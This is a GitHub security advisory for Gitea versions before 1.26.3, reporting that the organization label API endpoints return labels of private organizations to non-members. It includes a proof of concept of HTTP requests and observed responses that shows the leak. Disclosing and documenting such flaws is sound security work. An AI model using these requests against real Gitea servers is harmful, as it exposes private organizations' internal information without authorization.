# [H] Gitea: Unauthorized Access to Labels of Private Organizations

## Summary
Severity: High
Advisory: GHSA-v73x-hx65-6pf4
CVE: CVE-2026-25038
CWE: CWE-200, CWE-862
Ecosystem: Go
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N (CVSS_V3)
Published: 2026-07-21
Source: https://github.com/advisories/GHSA-v73x-hx65-6pf4
Type: github-advisory

## Affected
- Go: `code.gitea.io/gitea` — affected >=0 <1.26.3

## Details
## Summary

Gitea 1.26.2 does not properly enforce organization visibility restrictions on organization label read endpoints.

A user without access to a private organization can retrieve labels belonging to that organization through the Organization Labels API. As a result, label metadata intended to be restricted to organization members may be disclosed.

The issue is limited to unauthorized read access. No unauthorized modification of labels was observed.

## Details

The following endpoints are affected:

* `GET /api/v1/orgs/{org}/labels`
* `GET /api/v1/orgs/{org}/labels/{id}`

During testing, a private organization was created and a label was added to that organization.

Access to the organization itself was correctly restricted. A user without membership in the organization received a `404 Not Found` response when requesting organization information.

However, the same user was still able to retrieve organization labels through the endpoints listed above.

For comparison, other organization-scoped endpoints such as:

* `GET /api/v1/orgs/{org}/teams`
* `GET /api/v1/orgs/{org}/hooks`
* `GET /api/v1/orgs/{org}/actions/secrets`

correctly denied access to unauthorized users.

The label endpoints returned the full Label object, including fields such as:

* `id`
* `name`
* `description`
* `color`
* `url`

Write operations were tested separately and remained protected by authorization checks.

## PoC

### Setup

Create a private organization:

```http
POST /api/v1/orgs
Authorization: token <owner_token>

{
  "username": "target-org",
  "visibility": "private"
}
```

Create a label:

```http
POST /api/v1/orgs/target-org/labels
Authorization: token <owner_token>

{
  "name": "internal-label",
  "color": "#aabbcc",
  "description": "private organization label"
}
```

Verify that the organization is not accessible to a non-member:

```http
GET /api/v1/orgs/target-org
Authorization: token <non_member_token>
```

Response:

```http
HTTP/1.1 404 Not Found
```

### Retrieve all labels

Request:

```http
GET /api/v1/orgs/target-org/labels
Authorization: token <non_member_token>
```

Observed response:

```http
HTTP/1.1 200 OK
```

The response contains labels belonging to the private organization.

### Retrieve a specific label

Request:

```http
GET /api/v1/orgs/target-org/labels/1
Authorization: token <non_member_token>
```

Observed response:

```http
HTTP/1.1 200 OK
```

The full Label object is returned.

### Verify write protection

Request:

```http
PATCH /api/v1/orgs/target-org/labels/1
Authorization: token <non_member_token>
```

Response:

```http
HTTP/1.1 403 Forbidden
```

### PoC Details
https://anonymous.4open.science/r/Gitea_PoC-EC93/2_poc_private_org_labels_leak

## Impact

Users who are not authorized to access a private organization can obtain label metadata associated with that organization.

Depending on how labels are used, this may disclose internal organizational information contained in label names or descriptions.

The issue affects confidentiality only. No integrity or availability impact was observed.

## References
- https://github.com/go-gitea/gitea/security/advisories/GHSA-v73x-hx65-6pf4
- https://nvd.nist.gov/vuln/detail/CVE-2026-25038
- https://github.com/go-gitea/gitea/pull/38151
- https://github.com/go-gitea/gitea/commit/99f8b3d9a1d32f4c39828e07971455a18191e0b9
- https://blog.gitea.com/release-of-1.26.3-and-1.26.4
- https://github.com/go-gitea/gitea
- https://github.com/go-gitea/gitea/releases/tag/v1.26.3
